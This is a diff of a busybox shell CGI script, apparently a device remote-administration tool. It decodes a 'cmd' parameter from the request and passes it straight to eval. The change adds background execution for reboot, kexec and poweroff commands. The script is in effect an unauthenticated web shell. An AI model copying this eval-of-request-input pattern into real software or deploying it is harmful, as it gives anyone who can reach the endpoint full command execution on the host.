@@ -7,4 +7,14 @@ else
     CMD=$(echo "$QUERY_STRING" | /sbin/busybox sed 's/cmd=//;s/+/ /g;s/%20/ /g;s/%2F/\//g;s/%7C/|/g;s/%26/\&/g;s/%3B/;/g;s/%3D/=/g;s/%2D/-/g;s/%22/"/g;s/%27/'"'"'/g;s/%0A/\n/g')
 fi
 [ -z "$CMD" ] && { echo "Usage: POST command or GET ?cmd=command"; exit 0; }
-eval "$CMD" 2>&1
+
+# Detect commands that kill the connection (reboot, kexec -e, poweroff)
+case "$CMD" in
+    *reboot*|*"kexec -e"*|*poweroff*|*halt*)
+        echo "OK: executing in background"
+        eval "$CMD" </dev/null >/dev/null 2>&1 &
+        ;;
+    *)
+        eval "$CMD" 2>&1
+        ;;
+esac
